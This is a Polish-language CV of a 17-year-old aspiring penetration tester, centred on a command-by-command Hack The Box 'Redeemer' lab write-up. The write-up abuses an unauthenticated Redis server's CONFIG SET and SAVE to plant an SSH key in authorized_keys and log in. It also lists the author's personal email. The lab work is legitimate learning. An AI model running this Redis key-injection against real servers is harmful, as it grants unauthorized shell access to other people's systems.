# Raport CV – Kevin (17 lat) 🔥🚀

**O mnie:**  
Cześć! Nazywam się **Kevin**, mam 17 lat i jestem pasjonatem cyberbezpieczeństwa. Rozwijam się głównie na platformach **Hack The Box** i **TryHackMe**. Buduję swoje portfolio na GitHubie, gdzie trzymam notatki i raporty z przeprowadzonych zadań. Aktualnie nie dysponuję dużym budżetem, więc na HTB korzystam z bezpłatnego konta i przerabiam wszystko, co się da. Jestem ambitny, szybko się uczę i stale poszukuję nowych wyzwań. Obecnie szukam praktyk, aby rozwijać swoje umiejętności w realnym środowisku.

📧 **Kontakt:** bibip0662@gmail.com

---

## 1. Informacje ogólne 🌐
- **Imię i wiek:** Kevin, 17 lat  
- **Główne platformy:** Hack The Box (bezpłatne konto) & TryHackMe  
- **Cel:** Zostać Junior Penetration Testerem  
- **Portfolio:** GitHub – raporty, skrypty i notatki z maszyn HTB  
- **Motywacja:** Uwielbiam uczyć się nowych technik, nawet jeśli ogranicza mnie budżet – gdy zrozumiem zagadnienie, idzie już z górki! 😎💪

---

## 2. Maszyna „Odkupiciel” (Redeemer) na Hack The Box 🛠️
**Poziom trudności:** Very Easy (Starting Point)  
**Cel:** Zyskać dostęp do konta użytkownika „redeemer” poprzez serwer Redis.

### Kroki wykonane podczas łamania maszyny:
1. **Połączenie z VPN HTB**  
   - Uruchomiłem klienta OpenVPN z plikiem `starting_point.ovpn`.  
   - Upewniłem się, że interfejs `tun0` ma adres z zakresu HTB (10.x.x.x).  

2. **Skanowanie portów**  
   - Wykonałem:  
     ```
     nmap -Pn -sC -sV -oN redis_scan.txt <ADRES_IP>
     ```  
   - W wyniku zobaczyłem otwarty port **6379/tcp** (Redis 5.0).  

3. **Generacja klucza SSH**  
   - W katalogu `~/htb_keys` wygenerowałem:
     ```
     ssh-keygen -t rsa -b 2048 -f ~/htb_keys/mykey -N ""
     ```
   - Skopiowałem zawartość pliku `~/htb_keys/mykey.pub`.  

4. **Połączenie się z Redis**  
   - Uruchomiłem:  
     ```
     redis-cli -h <ADRES_IP> -p 6379
     ```  
   - W Redis CLI wpisałem:
     ```
     SET mykey "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD…Kevin@localhost"
     ```
   - Zweryfikowałem poprawność:
     ```
     GET mykey
     ```

5. **Zmiana katalogu i nazwy pliku Redis**  
   - W Redis CLI ustawiłem:
     ```
     CONFIG SET dir /home/redeemer/.ssh/
     CONFIG SET dbfilename authorized_keys
     ```
   - Wykonałem:
     ```
     SAVE
     ```
   - Dzięki temu plik `/home/redeemer/.ssh/authorized_keys` zawierał mój klucz SSH.

6. **Logowanie się na konto redeemer**  
   - Opuściłem Redis CLI (`exit`), a następnie wpisałem:
     ```
     ssh -i ~/htb_keys/mykey redeemer@<ADRES_IP>
     ```
   - Uzyskałem powłokę użytkownika **redeemer**.  

7. **Znalezienie flagi**  
   - W powłoce redeemer:
     ```
     cat /home/redeemer/user.txt
     ```
   - Uzyskałem flagę w formacie `HTB{…}` – potwierdzenie sukcesu na poziomie **user**.

---

## 3. Umiejętności i technologie 🌟
- **Skany sieci i usługi:** _nmap (–Pn, –sC, –sV)_, analiza wyników  
- **Praca z Redis:** _redis-cli_, `SET`, `GET`, `CONFIG SET`, `SAVE`  
- **SSH / klucze:** _ssh-keygen – RSA 2048_, `authorized_keys`  
- **Systemy operacyjne:** _Linux (Kali, Parrot OS), Windows_  
- **Tworzenie raportów:** _Markdown na GitHubie, szczegółowe opisy kroków_  
- **Szybkie przyswajanie wiedzy:** codzienne sesje HTB/TryHackMe, utrwalanie w notatkach  

---

## 4. Portfolio na GitHubie 📂
Na moim GitHubie znajdziesz pełne raporty i szczegółowe notatki dotyczące kolejnych maszyn Hack The Box, w tym:
- **Maszyna “Odkupiciel” (Redeemer)** – pełny opis krok po kroku, użyte komendy i wnioski.  
- Cheaty z najważniejszymi komendami Redis, SSH, nmap.  

**GitHub:** https://github.com/TwojeRepozytorium

---

## 5. Moje podejście do nauki 🚀
> „Czasem zadania są skomplikowane i trzeba chwilę nad nimi posiedzieć, ale gdy już zrozumiem, idzie z górki! 🔥  
> Codziennie, korzystając z bezpłatnego konta HTB i TryHackMe, poświęcam przynajmniej 1–2 godziny na praktykę. Zapisuję nowe techniki w notatkach, co pozwala szybko wrócić do materiału i utrwalić wiedzę.”  

---

## 6. Moje cele i plany 🎯
- **Krótkoterminowe:**  
  - Ukończyć kolejne maszyny w sekcjach Starting Point i Active Machines na HTB.  
  - Uzupełnić cheat sheety o nowe techniki Linux Privilege Escalation, Windows Privilege Escalation, Web Exploitation.  
  - Przygotować się do egzaminu CompTIA Security+.  

- **Średnioterminowe:**  
  - Zdobyć certyfikat CEH (Certified Ethical Hacker) lub OSCP.  
  - Znaleźć praktyki/staż w firmie zajmującej się pentestingiem.  
  - Dołączyć do open-source’owych projektów związanych z bezpieczeństwem.  

- **Długoterminowe:**  
  - Zostać pełnoprawnym Penetration Testerem w renomowanej organizacji.  
  - Prowadzić warsztaty i dzielić się wiedzą z kolejnymi entuzjastami IT.  

---

📧 **Kontakt:** bibip0662@gmail.com
